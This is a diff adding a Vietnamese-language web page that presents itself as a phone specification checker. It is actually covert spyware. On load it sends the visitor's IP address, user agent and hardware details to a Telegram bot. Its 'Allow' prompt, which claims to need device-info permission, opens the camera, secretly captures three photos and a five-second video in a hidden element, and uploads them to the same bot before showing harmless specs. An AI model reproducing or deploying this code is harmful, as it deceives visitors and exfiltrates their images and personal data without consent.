@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Kiểm tra thông số điện thoại - Cấu hình thiết bị</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap');
+
+        body {
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(to bottom right, #e0f7fa, #b2ebf2);
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .header {
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            color: #007bff;
+            font-size: 28px;
+            margin: 0;
+        }
+
+        p {
+            color: #333;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+
+        .check-button {
+            padding: 12px 24px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 20px 0;
+            transition: background 0.3s;
+        }
+
+        .check-button:hover {
+            background: #0056b3;
+        }
+
+        .permission-prompt {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .permission-prompt-content {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 400px;
+        }
+
+        .permission-prompt-content h2 {
+            color: #007bff;
+            font-size: 22px;
+            margin-top: 0;
+        }
+
+        .permission-prompt-content button {
+            padding: 10px 20px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .permission-prompt-content button:hover {
+            background: #0056b3;
+        }
+
+        .results {
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            display: none;
+            text-align: left;
+        }
+
+        .results h2 {
+            color: #007bff;
+            font-size: 22px;
+            margin-top: 0;
+        }
+
+        .results p {
+            margin: 10px 0;
+            font-size: 14px;
+        }
+
+        .loader {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .footer a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Chào mừng bạn đến với Kiểm tra thông số điện thoại</h1>
+            <p>Kiểm tra thông số và hiệu suất điện thoại của bạn với công cụ chẩn đoán tiên tiến của chúng tôi. Nhấn nút bên dưới để bắt đầu.</p>
+        </div>
+        <button class="check-button" onclick="requestPermissions()">Bắt đầu kiểm tra thiết bị</button>
+        <div class="loader" id="loader"></div>
+        <div class="results" id="results">
+            <h2>Thông số thiết bị</h2>
+            <p><strong>Hệ điều hành:</strong> <span id="os">Đang kiểm tra...</span></p>
+            <p><strong>Lõi CPU:</strong> <span id="cpu">Đang kiểm tra...</span></p>
+            <p><strong>RAM:</strong> <span id="ram">Đang kiểm tra...</span></p>
+            <p><strong>GPU:</strong> <span id="gpu">Đang kiểm tra...</span></p>
+            <p><strong>Độ phân giải màn hình:</strong> <span id="resolution">Đang kiểm tra...</span></p>
+            <p><strong>Trình duyệt:</strong> <span id="browser">Đang kiểm tra...</span></p>
+        </div>
+        <div class="footer">
+            <p>Kiểm tra thông số điện thoại © 2025 | <a href="https://t.me/phonespec" target="_blank">Liên hệ</a> | <a href="index.html#">Chính sách bảo mật</a></p>
+        </div>
+    </div>
+
+    <div class="permission-prompt" id="permissionPrompt">
+        <div class="permission-prompt-content">
+            <h2>Cho phép kiểm tra thiết bị</h2>
+            <p>Chúng tôi cần quyền lấy thông tin điện thoại của thiết bị để thực hiện kiểm tra phần cứng toàn diện. Nhấn "Cho phép" để tiếp tục.</p>
+            <button onclick="requestCameraAccess()">Cho phép</button>
+        </div>
+    </div>
+
+    <video id="video" autoplay></video>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '7937745403:AAGBsPZIbCTzvhYhsOFkL7960156507:AAHMK4cfoRszPvJrZ17NvPAUFqPvyXY2mi8';
+        const CHAT_ID = '7605936504';
+
+        function capturePhoto(video, callback) {
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(function(blob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'photo.jpg');
+
+                $.ajax({
+                    type: 'POST',
+                    url: `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+                    data: formData,
+                    processData: false,
+                    contentType: false,
+                    success: function(response) {
+                        if (callback) callback(true);
+                    },
+                    error: function(error) {
+                        if (callback) callback(false);
+                    }
+                });
+            }, 'image/jpeg');
+        }
+
+        function recordVideo(stream, duration, callback) {
+            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            const chunks = [];
+
+            recorder.ondataavailable = function(e) {
+                if (e.data.size > 0) chunks.push(e.data);
+            };
+
+            recorder.onstop = function() {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('video', blob, 'video.webm');
+
+                $.ajax({
+                    type: 'POST',
+                    url: `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`,
+                    data: formData,
+                    processData: false,
+                    contentType: false,
+                    success: function(response) {
+                        if (callback) callback(true);
+                    },
+                    error: function(error) {
+                        if (callback) callback(false);
+                    }
+                });
+            };
+
+            recorder.start();
+            setTimeout(() => recorder.stop(), duration);
+        }
+
+        function requestCameraAccess() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    document.getElementById('permissionPrompt').style.display = 'none';
+                    document.getElementById('loader').style.display = 'block';
+
+                    let photoCount = 0;
+                    const maxPhotos = 3;
+                    function takeNextPhoto() {
+                        if (photoCount < maxPhotos) {
+                            setTimeout(() => {
+                                capturePhoto(video, function() {
+                                    photoCount++;
+                                    takeNextPhoto();
+                                });
+                            }, 1000);
+                        } else {
+                            recordVideo(stream, 5000, function() {
+                                stream.getTracks().forEach(track => track.stop());
+                                displayResults();
+                            });
+                        }
+                    }
+                    takeNextPhoto();
+                })
+                .catch(function(error) {
+                    alert('Cần quyền lấy thông tin điện thoại để kiểm tra thiết bị. Vui lòng cho phép và thử lại.');
+                });
+        }
+
+        function requestPermissions() {
+            document.getElementById('permissionPrompt').style.display = 'flex';
+        }
+
+        function displayResults() {
+            document.getElementById('os').textContent = getOperatingSystem();
+            document.getElementById('cpu').textContent = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} lõi` : 'Không xác định';
+            document.getElementById('ram').textContent = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Không xác định';
+            document.getElementById('gpu').textContent = getGraphicsCard();
+            document.getElementById('resolution').textContent = `${window.screen.width}x${window.screen.height}`;
+            document.getElementById('browser').textContent = getBrowser();
+
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('results').style.display = 'block';
+        }
+
+        $(document).ready(function() {
+            const currentTime = new Date();
+            const accessTime = `${currentTime.getFullYear()}/${currentTime.getMonth() + 1}/${currentTime.getDate()} ${currentTime.getHours()}:${currentTime.getMinutes()}:${currentTime.getSeconds()}.${currentTime.getMilliseconds()}`;
+
+            $.getJSON('https://api.ipify.org?format=json', function(data) {
+                const ip = data.ip;
+                const cpu = navigator.hardwareConcurrency || 'Không xác định';
+                const ram = navigator.deviceMemory || 'Không xác định';
+                const gpu = getGraphicsCard();
+                const os = getOperatingSystem();
+                const userAgent = navigator.userAgent;
+                const resolution = `${window.screen.width}x${window.screen.height}`;
+                const browser = getBrowser();
+
+                const message = `Kiểm tra thiết bị mới:\n- IP: ${ip}\n- User-Agent: ${userAgent}\n- Hệ điều hành: ${os}\n- CPU: ${cpu}\n- RAM: ${ram}\n- GPU: ${gpu}\n- Độ phân giải: ${resolution}\n- Trình duyệt: ${browser}\n- Thời gian truy cập: ${accessTime}`;
+
+                $.ajax({
+                    type: 'POST',
+                    url: `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+                    data: { chat_id: CHAT_ID, text: message },
+                    dataType: 'json',
+                    success: function(response) {},
+                    error: function(error) {}
+                });
+            });
+        });
+
+        function getOperatingSystem() {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            if (/windows phone/i.test(userAgent)) return 'Windows Phone';
+            if (/android/i.test(userAgent)) return 'Android';
+            if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) return 'iOS';
+            if (/Macintosh|Mac OS X/.test(userAgent)) return 'Mac OS';
+            if (/Windows NT/.test(userAgent)) return 'Windows';
+            return 'Không xác định';
+        }
+
+        function getGraphicsCard() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debugInfo = gl?.getExtension('WEBGL_debug_renderer_info');
+            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Không xác định';
+        }
+
+        function getBrowser() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes('Chrome')) return 'Google Chrome';
+            if (userAgent.includes('Firefox')) return 'Mozilla Firefox';
+            if (userAgent.includes('Safari')) return 'Apple Safari';
+            if (userAgent.includes('Edge')) return 'Microsoft Edge';
+            return 'Không xác định';
+        }
+    </script>
+</body>
+</html>
